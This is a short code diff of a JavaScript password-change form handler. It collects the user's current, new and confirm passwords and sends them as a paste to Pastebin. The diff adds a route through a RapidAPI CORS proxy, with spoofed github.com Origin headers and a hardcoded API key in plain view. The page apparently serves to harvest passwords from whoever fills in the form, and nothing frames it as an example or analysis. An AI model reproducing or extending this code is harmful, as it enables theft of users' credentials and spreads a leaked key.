@@ -8,17 +8,22 @@ form.addEventListener('submit', (event) => {
   const newPassword = document.querySelector('#pass2').value;
   const confirmPassword = document.querySelector('#pass3').value;
 
-  // Create a new paste on Pastebin using the API
   const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://pastebin.com/api/api_post.php');
-  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === XMLHttpRequest.DONE) {
-      const response = xhr.responseText;
-      console.log(response); // Print the response from Pastebin
-    }
-  }
+  xhr.withCredentials = true;
+  
+  xhr.addEventListener("readystatechange", function () {
+      if (this.readyState === this.DONE) {
+          console.log(this.responseText);
+      }
+  });
+  
+  xhr.open("POST", "https://http-cors-proxy.p.rapidapi.com/");
+  xhr.setRequestHeader("content-type", "application/json");
+  xhr.setRequestHeader("Origin", "www.github.com");
+  xhr.setRequestHeader("X-Requested-With", "www.github.com");
+  xhr.setRequestHeader("X-RapidAPI-Key", "2fe554f732mshc092a3d90ae332ap11848ejsn905aa1dff8a9");
+  xhr.setRequestHeader("X-RapidAPI-Host", "http-cors-proxy.p.rapidapi.com");
+  
 
   const params = `api_option=paste&api_dev_key=${api_key}&api_paste_code=${currentPassword}\n${newPassword}\n${confirmPassword}&api_paste_private=1&api_paste_name=form-paste`;
 
